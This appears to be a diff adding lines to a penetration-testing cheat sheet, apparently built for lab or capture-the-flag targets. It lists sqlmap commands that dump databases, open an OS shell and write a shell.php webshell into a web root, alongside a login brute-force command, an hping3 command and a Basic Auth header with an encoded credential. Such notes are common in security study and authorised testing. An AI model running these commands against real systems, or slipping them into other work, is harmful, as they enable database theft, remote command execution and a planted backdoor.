@@ -577,5 +577,13 @@ python3 jsonbrute.py --url http://management.test.local/api/login --wordlist roc
 /usr/sbin/hping3 -1 127.0.0.1 -9 signature -I lo
 
 [sqlmap]
+# view privilege
+--privilege
+# enter os command/upload webshell
+--os-shell
+# write file
+sqlmap -u 'http://example.com/?username=admin' --dbs --level 4 --risk 3 --file-write shell.php --file-dest '/var/www/html/shell.php'
+# dump database
 sqlmap -u 'http://10.10.110.124/login.php?username=admin&password=admin' --dbs --batch --level 4 --risk 3
+# with Basic Authentication
 sqlmap -u 'http://10.10.110.124/login' --form --dbs --batch --level 4 --risk 3 --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
